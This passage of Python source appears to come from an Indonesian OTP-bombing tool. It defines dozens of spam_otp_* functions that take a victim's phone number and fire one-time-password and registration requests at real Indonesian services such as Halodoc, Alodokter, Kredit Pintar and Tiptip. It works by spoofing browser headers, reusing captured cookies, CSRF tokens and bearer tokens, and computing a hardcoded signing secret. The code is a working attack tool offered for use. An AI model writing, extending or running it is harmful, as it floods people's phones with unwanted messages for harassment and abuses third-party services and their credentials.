segment-utm=eyJpdG1fbWkaX=tIjoiIiwiaXRtX3NvdXJjZSI6IiIsInBhZ2=fcm=mZXJyZXIiOiJodHRwczovL3d3dy5nb29nbGUuY29tLyIsInNlc3Npb25fY291bnQiOjMsInNlc3Npb25fcm=mZXJyZXIiOjE3ODAxODIxMzE0MTIsInRpbW=zdGFtcCI6MTc4MDE4MjE3MDg0OSwidXRtX2NhbXBhaWduIjoiIiwidXRtX21lZGl1bSI6IiIsIn=0b=9zb3=yY2UiOiIifQzz; FCNEC=%5B%5B%22AKsRol-ufo=7rjU2mcoI=kLK9e4X2SajLpPwjup6Os7MDD0gzmh_Cgps6b5CUxPAUD9eSXrKUE0ClyvIK2CkIZkYxujk5vOnGmDR050J8xB26-Hqp6hvMh1wYxihBBen1G3_ysUKac0FyaTTkRoQ-ZefR2bi6ko8TA%3D%3D%22%5D%5D; _ga_D5=06TRY2RzGS2.1.s1780182173$o4$g0$t1780182173$j60$l0$h0; __rtbh.lid=%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22WHnraPibWLKLluimE5Gw%22%2C%22expiryDate%22%3A%222027-05-30T23%3A02%3A54.553Z%22%7D; ttcsid=1780182175610::ron=FY0wjKCEa72LL2gJ.4.1780182182816.0::1.-37243.0::7090.2.285.885::0.0.0; ttcsid_C2OBT2A3E7AM6FQ8BMMG=1780182175601::NBtm-TUK-lurT5Q-Kl19.4.1780182182817.0; _ga_Z36X54E7Z5=GS2.1.s1780182173$o4$g0$t1780182182$j51$l0$h0; _gcl_au=1.1.950890321.1780038193.1925756783.1780182179.1780182183"
        }

        payload = {
            "ipAddress": f"140.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "phoneNumber": nomor_lokal,
            "portalId": 1,
            "type": "WHATSAPP",
            "url": "https://www.rumah123.com/user/login?redirect=https://www.rumah123.com/"
        }

        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
     except:
        return False

def spam_otp_halodoc(nomor):
     try:
        if nomor.startswith("0"):
            nomor_lokal = "62" + nomor[1:]
        elif nomor.startswith("62"):
            nomor_lokal = nomor
        else:
            nomor_lokal = "62" + nomor

        session = requests.Session()
        url = "https://customers.api.halodoc.com/magneto-api/v2/users/authentication/otp/requests"

        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json, text/plain, */*",
            'Accept-Encoding': "gzip, deflate, br",
            'Content-Type': "application/json",
            'sec-ch-ua-platform': '"Android"',
            'X-XSRF-TOKEN': "E581E099A363DC049909F3AACDCEA6248D995C45F4A53111BDA0A626487D025AD83FD42B99E0FFA4CF48A9663628E322BEE9",
            'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            'sec-ch-ua-mobile': "?1",
            'Origin': "https://www.halodoc.com",
            'Sec-Fetch-Site': "same-site",
            'Sec-Fetch-Mode': "cors",
            'Sec-Fetch-Dest': "empty",
            'Referer': "https://www.halodoc.com/",
            'Accept-Language': "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            'Cookie': "rx=isitorrwlrur9lz1780208322401=UP888O9A=FOLNR8R0HR3389UTPU62HD; dtSarwlrur9lz-; _gcl_au=1.1.1758244023.1780208325; _ga=GA1.1.51880007.1780208328; rxvtrwlrur9lz1780210130688|1780208322422; dtPCrwlrur9lz5$8322365_313h32vHSWFLANATLPCNEMPCUQHAFKRGRTPDUTW-0e0; dtCookierwlrur9lzv_4_srv_5_sn_85FE102AE029FEC31922E56941139E18_app-3Ae28137e9070184e7_0_app-3Aea7c4b59f27d43eb_0_ol_0_perc_100000_mul_1_rcs-3Acss_0; afUserId=69040147-6a0d-47d5-8454-8d920230c2f0-p; AF_SYNC=1780208331597; WZRK_Gz=f8f4004de684498e9aea0d16dcfc99d4; WZRK_S_WR9-ZRZ-9W7Z=%7B%22p%22%3A1%2C%22s%22%3A1780208334%2C%22t%22%3A1780208334%7D; _ga_02NBJNEK=HGS2.1.s1780208328$o1$g0$t1780208338$j50$l0$h0; XSRF-TOKEN=E581E099A363DC049909F3AACDCEA6248D995C45F4A53111BDA0A626487D025AD83FD42B99E0FFA4CF48A9663628E322BEE9"
        }

        payload = {
            "phone_number": f"+{nomor_lokal}",
            "channel": "whatsapp",
            "otp_resent": False,
            "clientId": "4dccb45a031542ad01fd22931238c909"
        }

        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
     except:
        return False

def spam_otp_misteraladin(nomor):
    try:
        if nomor.startswith('0'):
            nomor = nomor[1:]
        elif nomor.startswith('62'):
            nomor = nomor[2:]
        elif nomor.startswith('+62'):
            nomor = nomor[3:]
        else:
            nomor = nomor

        import time
        import hashlib

        timestamp = str(int(time.time()))

        secret = '6c7A1ZUdVtREXQxO5XcW83ESODEoUld7fJGZCvor8awEcm24tr'
        raw = f'{secret}{timestamp}'
        member_token = hashlib.sha256(raw.encode()).hexdigest()

        url = 'https://m.misteraladin.com/api/members/v2/otp/request'

        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'id',
            'content-type': 'application/json',
            'origin': 'https://m.misteraladin.com',
            'referer': 'https://m.misteraladin.com/account',
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36',
            'x-member-token': member_token,
            'x-platform': 'mobile-web',
            'x-request-time': timestamp
        }

        payload = {
            "phone_number_country_code": "62",
            "phone_number": nomor,
            "type": "register"
        }

        resp = requests.post(url, json=payload, headers=headers, timeout=10)

        if resp.status_code == 200:
            try:
                data = resp.json()
                if data.get('data') and data['data'].get('phone_number'):
                    return True
                elif data.get('status') == 'success' or data.get('success') == True:
                    return True
                else:
                    return False
            except:
                return True
        else:
            return False

    except Exception as e:
        return False

def spam_otp_paper(nomor):
     try:
        if nomor.startswith("0"):
            nomor_lokal = "62" + nomor[1:]
        elif nomor.startswith("+"):
            nomor_lokal = nomor[1:]
        elif nomor.startswith("62"):
            nomor_lokal = nomor
        else:
            nomor_lokal = "62" + nomor

        session = requests.Session()
        url = "https://register.paper.id/api/v1/auth/register/send-otp"

        headers = {
            'Content-Type': 'application/json',
            'Origin': 'https://paper.id',
            'x-paper-user-agent': 'multiverse/2.54.1 mobile_web (android) chrome',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Referer': 'https://paper.id/'
        }

        payload = {
            "phone": nomor_lokal,
            "method": "whatsapp",
            "registered_by": "flutter mweb"
        }

        resp = session.post(url, json=payload, headers=headers, timeout=10)


        if resp.status_code == 200:
            data = resp.json()
            if data.get("status") == "success" or "otp" in str(data).lower():
                return True
            else:
                return False
        else:
            return False

     except Exception as e:
        return False

def spam_otp_singa_toy(nomor):
    try:
        if nomor.startswith('62'):
            nomor = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            nomor = '0' + nomor[3:]
        elif nomor.startswith('0'):
            nomor = nomor
        else:
            nomor = '0' + nomor

        models = ['SM-S928B', 'SM-G965N', 'SM-N975F', 'SM-A515F', 'SM-M127F', 'Infinix X6532C', 'Redmi Note 10', 'POCO X3', 'vivo 2007', 'OPPO CPH2083']
        model = random.choice(models)

        versions = ['2.4.7', '2.4.8', '2.4.9', '2.5.0', '2.5.1']
        versionName = random.choice(versions)
        versionCode = versionName.replace('.', '')

        systemVersions = ['11', '12', '13', '14']
        systemVersion = random.choice(systemVersions)

        appsflyer_id = str(int(time.time() * 1000)) + '-' + str(random.randint(1000000000000000000, 9999999999999999999))

        session = requests.Session()

        headers = {
            'Content-Type': 'application/json; charset=utf-8',
            'User-Agent': f'Mozilla/5.0 (Linux; Android {systemVersion}; {model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36'
        }

        url = f'https://api102.singa.id/new/login/sendWaOtp?versionName={versionName}&versionCode={versionCode}&model={model}&systemVersion={systemVersion}&platform=android&appsflyer_id={appsflyer_id}'

        payload = {
            'mobile_phone': nomor,
            'type': 'mobile',
            'is_switchable': 1
        }

        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return spam_otp_nilai(resp.text, '"msg":"', '"') == 'Success'
    except:
        return False

def spam_otp_planetban(nomor):
     try:

        if nomor.startswith("62"):
            nomor_lokal = "0" + nomor[2:]
        elif nomor.startswith("+"):
            nomor_lokal = "0" + nomor[3:] if nomor.startswith("+62") else "0" + nomor[1:]
        elif nomor.startswith("0"):
            nomor_lokal = nomor
        else:
            nomor_lokal = "0" + nomor

        import random
        import string
        random_name = f"User{random.randint(100,999)}"
        random_password = ''.join(random.choices(string.ascii_letters + string.digits, k=8))

        session = requests.Session()
        url = "https://api.planetban.com/website/customer/request-otp"

        headers = {
            'Content-Type': 'application/json',
            'Origin': 'https://planetban.com',
            'Referer': 'https://planetban.com/',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Accept': 'application/json, text/plain, */*'
        }

        payload = {
            "name": random_name,
            "phone": nomor_lokal,
            "password": random_password,
            "purpose": "register",
            "method": "whatsapp"
        }

        resp = session.post(url, json=payload, headers=headers, timeout=10)

        if resp.status_code == 200:
            data = resp.json()
            if data.get("status") == True or data.get("success") == True or "success" in str(data).lower():
                return True
            else:
                return False
        else:
            return False

     except Exception as e:
        return False

def spam_otp_bunda(nomor):
     try:
        if nomor.startswith("0"):
            nomor_lokal = "62" + nomor[1:]
        elif nomor.startswith("+"):
            nomor_lokal = nomor[1:]
        elif nomor.startswith("62"):
            nomor_lokal = nomor
        else:
            nomor_lokal = "62" + nomor

        session = requests.Session()
        url = "https://cms.bunda.co.id/api/v1/auth/send-otp"

        headers = {
            'Content-Type': 'application/json',
            'Origin': 'https://www.bunda.co.id',
            'x-locale': 'id',
            'Referer': 'https://www.bunda.co.id/',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
        }

        payload = {
            "phone_number": int(nomor_lokal),
            "type": "auth"
        }

        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
     except:
        return False

def spam_otp_bonusbelanja(nomor):
     try:
        if nomor.startswith("0"):
            nomor_lokal = "62" + nomor[1:]
        elif nomor.startswith("+"):
            nomor_lokal = nomor[1:]
        elif nomor.startswith("62"):
            nomor_lokal = nomor
        else:
            nomor_lokal = "62" + nomor

        session = requests.Session()
        url = "https://www.bonusbelanja.com/api/auth/registration/app"

        headers = {
            'Content-Type': 'application/json',
            'Origin': 'https://www.bonusbelanja.com',
            'Referer': 'https://www.bonusbelanja.com/register/',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
        }

        payload = {
            "phone": nomor_lokal,
            "name": "User",
            "agreeTnc": True,
            "agreeContact": True
        }

        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
     except:
        return False

def spam_otp_hijup(nomor):
     try:
        if nomor.startswith("0"):
            nomor_lokal = "62" + nomor[1:]
        elif nomor.startswith("+"):
            nomor_lokal = nomor[1:]
        elif nomor.startswith("62"):
            nomor_lokal = nomor
        else:
            nomor_lokal = "62" + nomor

        session = requests.Session()
        url = "https://www.hijup.com/sign_in"

        headers = {
            'Content-Type': 'text/plain;charset=UTF-8',
            'Origin': 'https://www.hijup.com',
            'next-action': 'b7eda6e749fbadcfcf226c2e36865091520b679f',
            'next-router-state-tree': '%5B%22%22%2C%7B%22children%22%3A%5B%5B%22merchant%22%2C%22hijup%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%22sign_in%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D',
            'next-url': '/sign_in',
            'Referer': 'https://www.hijup.com/sign_in',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
        }

        payload = f'[{{"phone_number":"{nomor_lokal}","store_path":"hijup"}}]'

        resp = session.post(url, data=payload, headers=headers, timeout=10)
        return resp.status_code < 400
     except:
        return False

def spam_otp_alodokter_sms(nomor):
    try:
        if nomor.startswith('0'):
            nomor_lokal = nomor
        elif nomor.startswith('62'):
            nomor_lokal = '0' + nomor[2:]
        else:
            nomor_lokal = '0' + nomor

        raw = nomor_lokal[1:] if nomor_lokal.startswith('0') else nomor_lokal

        uuid_val = str(uuid.uuid4())

        session = requests.Session()
        url = "https://www.alodokter.com/resend-otp"

        headers = {
            'Content-Type': 'application/json',
            'Origin': 'https://www.alodokter.com',
            'x-csrf-token': 'Q40kfZBa/+ipTHv2irApJ9WBV3zSw8C55llxXbw+qPmG6LrCzTXxJaxKV1mQpLLXp0XpOkmYZBSjgVV2a+itPg==',
            'Referer': f'https://www.alodokter.com/otp_phone_number?type=register&phone={raw}',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Accept': 'application/json',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin'
        }

        payload = {
            "user": {
                "phone": nomor_lokal,
                "uuid": uuid_val
            },
            "request_via": "sms"
        }

        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
    except:
        return False

def spam_otp_alodokter(nomor):
     try:
        if nomor.startswith("0"):
            nomor_lokal = nomor
        elif nomor.startswith("62"):
            nomor_lokal = "0" + nomor[2:]
        else:
            nomor_lokal = "0" + nomor

        raw = nomor_lokal[1:] if nomor_lokal.startswith("0") else nomor_lokal

        import uuid
        uuid_val = str(uuid.uuid4())

        session = requests.Session()
        url = "https://www.alodokter.com/resend-otp"

        headers = {
            'Content-Type': 'application/json',
            'Origin': 'https://www.alodokter.com',
            'x-csrf-token': 'o/FdMeWMEtf5/jbtImqJr9Wuau4r9I/boJAwEcUQv3x+WGzrnGnjY3WdVSdd9P2FVrx17l4r02I7VLEjCYoPrg==',
            'Referer': f'https://www.alodokter.com/otp_phone_number?type=register&phone={raw}',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
        }

        payload = {
            "user": {
                "phone": nomor_lokal,
                "uuid": uuid_val
            },
            "request_via": "whatsapp"
        }

        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
     except:
        return False


def spam_otp_optikmelawai(nomor):
     try:
        if nomor.startswith("0"):
            nomor_lokal = "62" + nomor[1:]
        elif nomor.startswith("+"):
            nomor_lokal = nomor[1:]
        elif nomor.startswith("62"):
            nomor_lokal = nomor
        else:
            nomor_lokal = "62" + nomor

        session = requests.Session()
        url = "https://api.optikmelawai.com/api/v3/auth/register/1"

        headers = {
            'authorization': 'Bearer a6a84b1f1e604d683fbef2295c2262373eba254197a1e14ab3a1e95a4394e4debf13560e5dbd66ab1e628aa3e73d3667d11f083077e562169b78d2ef2f3d285542a22f5ae174badd1313593deb5ec4389c75de38055b4964969a8323f031d47a6b35b3af4a096a08d6dddc2bf616c36bbeea1602b5b8a041650909107c207ed9',
            'x-unique-user': 'GA1.1.1062236172.1780823549',
            'language': 'id',
            'Origin': 'https://www.optikmelawai.com',
            'Referer': 'https://www.optikmelawai.com/',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
        }

        data = {
            "phone_number": nomor_lokal,
            "name": "User",
            "email": f"user{random.randint(100000,999999)}@gmail.com",
            "password": "Test123",
            "password_confirmation": "Test123"
        }

        resp = session.post(url, data=data, headers=headers, timeout=10)
        return resp.status_code < 400
     except:
        return False


def spam_otp_jembatani(nomor):
     try:
        if nomor.startswith("0"):
            nomor_lokal = nomor
        elif nomor.startswith("62"):
            nomor_lokal = "0" + nomor[2:]
        else:
            nomor_lokal = "0" + nomor

        import random
        import string
        rand_name = 'User' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
        rand_pass = "Test@" + ''.join(random.choices(string.ascii_letters + string.digits, k=5)) + "#1"

        session = requests.Session()
        url = "https://api.jembatani.co.id/v1/register"

        headers = {
            'Content-Type': 'application/json',
            'Origin': 'https://jembatani.co.id',
            'Referer': 'https://jembatani.co.id/',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
        }

        payload = {
            "phone": nomor_lokal,
            "name": rand_name,
            "password": rand_pass
        }

        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
     except:
        return False

def spam_otp_rcx(nomor):
     try:
        if nomor.startswith("0"):
            nomor_lokal = nomor[1:]
        elif nomor.startswith("62"):
            nomor_lokal = nomor[2:]
        else:
            nomor_lokal = nomor

        import random
        import string
        rand_name = 'User' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
        rand_email = f'user{random.randint(1000,9999)}@mailnesia.com'

        session = requests.Session()
        url = "https://sso.rcx.co.id/auth/passwordless/request"

        headers = {
            'Content-Type': 'application/json',
            'Origin': 'https://sso.rcx.co.id',
            'Referer': 'https://sso.rcx.co.id/',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
        }

        payload = {
            "phone": nomor_lokal,
            "name": rand_name,
            "email": rand_email
        }

        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
     except:
        return False

def spam_otp_sahabatteknisi(nomor):
     try:
        if nomor.startswith("0"):
            nomor_lokal = nomor[1:]
        elif nomor.startswith("62"):
            nomor_lokal = nomor[2:]
        else:
            nomor_lokal = nomor

        session = requests.Session()
        url = "https://www.sahabatteknisi.co.id/api/auth/otp/check-phone"

        headers = {
            'Content-Type': 'application/json',
            'Origin': 'https://www.sahabatteknisi.co.id',
            'Referer': 'https://www.sahabatteknisi.co.id/',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
        }

        payload = {"phone": nomor_lokal}

        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
     except:
        return False

def spam_otp_liva(nomor):
     try:

        if nomor.startswith('0'):
            nomor = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            nomor = nomor[1:]
        elif not nomor.startswith('62'):
            nomor = '62' + nomor


        device_id = str(uuid.uuid4())
        device_name = random.choice(['Samsung', 'Xiaomi', 'Realme', 'Oppo', 'Vivo', 'OnePlus'])

        url = 'https://cms-2f7gt694.liva-auto.id/api/public/auth-ada/send-otp'
        headers = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-store',
            'content-type': 'application/json',
            'origin': 'https://liva-auto.id',
            'referer': 'https://liva-auto.id/',
            'user-agent': random.choice([
                'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/119.0.0.0 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 Chrome/118.0.0.0 Mobile Safari/537.36'
            ]),
            'x-app-version': '1.9.259',
            'x-device-id': device_id,
            'x-device-name': device_name,
            'x-platform': 'web'
        }
        payload = {
            'phoneNumber': nomor
        }

        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400

     except Exception as e:
        return False

def spam_otp_daihatsu(nomor):
     try:

        if nomor.startswith('0'):
            nomor = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            nomor = nomor[1:]
        elif not nomor.startswith('62'):
            nomor = '62' + nomor

        session = requests.Session()
        resp_page = session.get(
            'https://www.astra-daihatsu.id/register',
            headers={'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'},
            timeout=10
        )

        import re
        csrf_match = re.search(r'CSRFToken.*?value=\"([^\"]+)\"', resp_page.text)
        if not csrf_match:
            return False
        csrf = csrf_match.group(1)

        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'content-type': 'application/json; charset=UTF-8',
            'csrftoken': csrf,
            'origin': 'https://www.astra-daihatsu.id',
            'referer': 'https://www.astra-daihatsu.id/register',
            'x-requested-with': 'XMLHttpRequest',
            'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin'
        }

        resp = session.post(
            'https://www.astra-daihatsu.id/otp/whatsapp/generate',
            json={'phoneNo': nomor},
            headers=headers,
            timeout=10
        )

        return resp.status_code < 400

     except Exception:
        return False

def spam_otp_kreditpintar(nomor):
     try:
        if nomor.startswith('0'):
            nomor = '+62' + nomor[1:]
        elif nomor.startswith('62'):
            nomor = '+' + nomor
        elif not nomor.startswith('+62'):
            nomor = '+62' + nomor

        uuid_val = str(__import__('uuid').uuid4())
        session = requests.Session()
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'id',
            'content-type': 'application/json',
            'origin': 'https://go.kreditpintar.com',
            'referer': f'https://go.kreditpintar.com/OFFICIAL2021/code-step?m={nomor}',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
            'x-adv-market-channel': 'OfficialWebsite',
            'x-adv-uuid': uuid_val,
            'x-app-version': 'APPVERSION_NAME(9999)',
            'x-os-type': 'WEB',
            'x-user-agent': f'Pintar-ID-Cash (WebAndroid;;;id) uuid/{uuid_val} version/0.1.0'
        }

        resp = session.post(
            'https://go.kreditpintar.com/api/auth/send-code?channel=OFFICIAL2021&lang=id',
            json={'mobileNumber': nomor, 'type': 'SMS'},
            headers=headers,
            timeout=10
        )

        return resp.status_code < 400

     except Exception:
        return False

def spam_otp_internetrakyat(nomor):
     try:
        if nomor.startswith('62'):
            nomor = '0' + nomor[2:]

        session = requests.Session()
        headers = {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json',
            'Origin': 'https://internetrakyat.id',
            'Referer': 'https://internetrakyat.id/auth/register',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
            'x-api-key': '280999!FTTH'
        }

        resp = session.post(
            'https://internetrakyat.id/api/app/auth/send-otp-register',
            json={'phone_number': nomor},
            headers=headers,
            timeout=10
        )

        return resp.status_code < 400

     except Exception:
        return False

def spam_otp_pinjamduit(nomor):
     try:
        if nomor.startswith('62'):
            nomor = '0' + nomor[2:]


        session = requests.Session()
        BASE = 'https://api.pinjamduit.co.id'

        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': BASE,
            'Referer': BASE + '/h5/download_selfmedia.html'
        }

        r1 = session.post(
            BASE + '/gw/loan/credit-user/checkPhoneWeb',
            headers=headers,
            data={
                'phone': nomor,
                'mobilePhone': nomor,
                'uuid': str(uuid.uuid4()),
                'deviceId': 'wh',
                'appMarket': 'web',
                'appVersion': '99.99.99',
                'clientType': 'w',
                'ts': int(time.time() * 1000)
            },
            timeout=10
        )

        res1 = r1.json()
        if res1.get('code') != '0':
            return False

        wybs = res1['data']['wybs']
        sms_useage = 10 if res1['data']['isExist'] == 1 else 0

        headers2 = headers.copy()
        headers2['ss'] = wybs

        r2 = session.post(
            BASE + '/gw/loan/credit-user/checkPhoneNext',
            headers=headers2,
            data={
                'phone': nomor,
                'mobilePhone': nomor,
                'sms_service': 2,
                'sms_useage': sms_useage,
                'deviceId': 'wh',
                'appMarket': 'web',
                'appVersion': '99.99.99',
                'clientType': 'w',
                'ts': int(time.time() * 1000)
            },
            timeout=10
        )

        res2 = r2.json()
        return res2.get('code') == '0'

     except Exception:
        return False

def spam_otp_isellershop(nomor):
     try:
        if nomor.startswith('62'):
            nomor = '0' + nomor[2:]

        headers = {
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://warungyeahbintan.isellershop.com',
            'referer': 'https://warungyeahbintan.isellershop.com/register',
            'x-requested-with': 'XMLHttpRequest',
            'x-sat': 'oCQ4sBq2nu1Bh9S3Vo7r8vImrDsZ+dvgZNzwSwJyCiI=',
            'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'
        }

        resp = requests.post(
            'https://warungyeahbintan.isellershop.com/services/identity/requestOTP',
            headers=headers,
            data={'destination': nomor, 'otpLength': '10'},
            timeout=10
        )

        return resp.status_code < 400

     except Exception:
        return False

def spam_otp_greensm(nomor):
     try:
        if nomor.startswith('0'):
            nomor = '+62' + nomor[1:]
        elif nomor.startswith('62'):
            nomor = '+' + nomor
        elif not nomor.startswith('+62'):
            nomor = '+62' + nomor

        headers = {
            'accept': '*/*',
            'content-type': 'application/json',
            'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'
        }

        payload = {
            'HiringSource': 'Iklan di surat kabar atau dalam aplikasi',
            'Education': 's2',
            'WorkExperience': 'Sopir komersial',
            'City': 'BT',
            'Type': 'CAR_SHARING',
            'Tel': nomor,
            'Name': 'Budi Santoso',
            'Country': 'ID',
            'ReferralCode': '',
            'Source': '',
            'AffiliateNumber': '',
            'Campaign': ''
        }

        resp = requests.post(
            'https://gapi.indo.greensm.com/car/acquisition/create-registration',
            headers=headers,
            json=payload,
            timeout=10
        )

        return resp.status_code < 400

     except Exception:
        return False

def spam_otp_tiptip(nomor):
    try:
        if nomor.startswith("0"):
            nomor_lokal = "+62" + nomor[1:]
        elif nomor.startswith("62"):
            nomor_lokal = "+" + nomor
        elif nomor.startswith("+62"):
            nomor_lokal = nomor
        else:
            nomor_lokal = "+62" + nomor

        curl_cmd = f"""curl -s -X POST 'https://api.tiptip.id/authentication/guest/v1/phone/otp/send' \\
  -H 'host: api.tiptip.id' \\
  -H 'channel-device: Chrome' \\
  -H 'language: id' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'x-queueit-ajaxpageurl: https%3A%2F%2Ftiptip.id%2Fsign-up' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'request-id: lqk1vR37' \\
  -H 'accept: application/json' \\
  -H 'channel: WEB' \\
  -H 'content-type: application/json' \\
  -H 'ip-address: 140.213.1.90' \\
  -H 'country-code: ID' \\
  -H 'channel-fingerprint-additional: 80bdd1ef0481d468fcab2d497eba68e5' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'channel-fingerprint: 1a036d18b3d9bd-0fccb1b1778ae9-b457251-88422-1a036d18b3e9be' \\
